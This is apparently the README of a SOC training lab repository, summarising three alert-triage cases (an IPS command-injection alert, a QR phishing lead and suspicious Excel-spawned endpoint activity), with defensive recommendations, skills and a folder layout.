This lab shows SOC triage moving from alerts to evidence-supported conclusions. Case 1 is a true-positive exploitation attempt with Mirai-related payload context, but compromise requires server-side proof. Case 2 is likely false positive for confirmed phishing because the QR flow reaches legitimate Facebook/Meta infrastructure. Case 3 is suspicious endpoint activity built from `Gift.xlsm`, Excel-linked `whoami`, `file.io` downloads, MalwareBazaar-style transfer, domain-controller checks, and cleanup artifacts.

## Recommendations

- Correlate FortiGate IPS logs with `web.seesec.co.il` web server logs, file-system changes, endpoint telemetry, and outbound connections before declaring successful exploitation.
- Block or monitor confirmed malicious indicators such as payload hosts and suspicious source IPs after validating business impact.
- Preserve original emails with full headers so SPF, DKIM, DMARC, Received path, URL rewriting, and click telemetry can be reviewed.
- For QR cases, confirm sender identity and campaign ownership before blocking known educational domains; classify ad-supported redirect services separately from credential-harvesting phishing.
- Treat Office-spawned command execution as high priority when it appears with macro-enabled files, downloads, account discovery, network reachability checks, or cleanup tools.
- Search across the environment for the same IP addresses, URLs, filenames, hashes, parent-process chains, and command-line patterns.
- Use the cases to improve IPS prevention tuning, mail-security filtering, QR-phishing awareness, Office macro controls, and endpoint process monitoring.

## Skills Demonstrated

- SOC alert triage
- FortiGate IPS log interpretation
- Command-injection analysis
- Threat-intelligence enrichment
- QR phishing investigation
- Microsoft Sentinel KQL
- Sysmon process telemetry review
- IOC extraction
- MITRE ATT&CK mapping
- Incident-response recommendation writing

## Repository Structure

```text
soc-alert-investigation-lab/
|-- README.md
|-- LICENSE
|-- IMAGE_MANIFEST.md
|-- docs/
|   |-- fortigate-command-injection-log.csv
|   |-- indicators.md
|   |-- quishing-network-evidence.md
|   `-- queries.md
`-- images/
    |-- 01-command-injection/
    |-- 02-quishing/
    |-- 03-sentinel-sysmon/
    `-- 99-source-context/
```
